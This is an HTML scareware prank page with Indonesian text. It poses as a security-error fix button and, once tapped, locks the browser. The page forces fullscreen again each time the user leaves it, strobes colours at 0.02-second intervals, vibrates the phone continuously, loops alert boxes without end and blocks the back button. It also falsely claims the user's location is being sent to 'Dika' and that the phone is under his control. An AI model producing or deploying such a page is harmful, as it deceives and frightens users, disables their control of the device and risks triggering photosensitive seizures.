<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>!!! SYSTEM DESTROYED !!!</title>
    <style>
        * { -webkit-tap-highlight-color: transparent; outline: none; }
        body {
            background-color: #000;
            margin: 0;
            overflow: hidden;
            font-family: 'Arial Black', sans-serif;
            height: 100vh;
            width: 100vw;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
            flex-direction: column;
            user-select: none;
        }

        /* Background kedap-kedip super cepat */
        #chaos-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 1000;
            display: none;
            animation: flash 0.02s infinite;
        }

        @keyframes flash {
            0% { background: #ff0000; }
            50% { background: #fff; }
            100% { background: #0000ff; }
        }

        .content {
            position: relative;
            z-index: 1001;
            text-align: center;
            display: none;
        }

        h1 { font-size: 60px; margin: 0; color: #fff; text-shadow: 10px 10px #000; line-height: 1; }
        .alert-text { font-size: 40px; background: yellow; color: red; padding: 20px; font-weight: bold; }

        #start-btn {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 9999;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #ff0000;
            font-size: 20px;
            cursor: pointer;
            border: none;
        }
    </style>
</head>
<body>

    <button id="start-btn" onclick="goCrazy()">
        [!] SYSTEM SECURITY BREACH [!]<br>
        TAP TO FIX ERROR
    </button>

    <div id="chaos-overlay"></div>

    <div class="content" id="ui">
        <h1>SUNGKEM<br>KE DIKA!</h1>
        <p class="alert-text">SISTEM TERKUNCI TOTAL</p>
        <p style="font-size: 15px;">MENGIRIM LOKASI ANDA KE DIKA...</p>
    </div>

    <script>
        function goFullScreen() {
            let elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) {
                elem.msRequestFullscreen();
            }
        }

        function vibrateNonStop() {
            if (navigator.vibrate) {
                // Getar 10 detik penuh
                navigator.vibrate(10000);
            }
        }

        function goCrazy() {
            // Langsung Fullscreen
            goFullScreen();

            // Sembunyikan tombol, munculkan chaos
            document.getElementById('start-btn').style.display = 'none';
            document.getElementById('chaos-overlay').style.display = 'block';
            document.getElementById('ui').style.display = 'block';

            // Getar brutal terus-menerus
            setInterval(() => {
                vibrateNonStop();
            }, 1000);

            // Trik Fullscreen Terus: Setiap kali user klik OK di alert, masuk fullscreen lagi
            setTimeout(() => {
                while(true) {
                    goFullScreen(); // Paksa fullscreen lagi
                    alert("⚠️ ERROR 666: SUNGKEM KE DIKA SEKARANG!");
                    alert("MAU KELUAR? SUNGKEM DULU!");
                    alert("HP ANDA SEDANG DIKENDALIKAN DIKA!");
                    vibrateNonStop();
                }
            }, 500);
        }

        // Blokir tombol Back
        history.pushState(null, null, location.href);
        window.onpopstate = function() {
            history.go(1);
            goFullScreen();
            alert("AKSES DIBLOKIR! SUNGKEM KE DIKA!");
        };

        // Jika user mencoba keluar dari fullscreen (misal tekan tombol Esc di keyboard atau navigasi hp)
        document.addEventListener("fullscreenchange", () => {
            if (!document.fullscreenElement) {
                goFullScreen();
            }
        });
    </script>
</body>
</html>
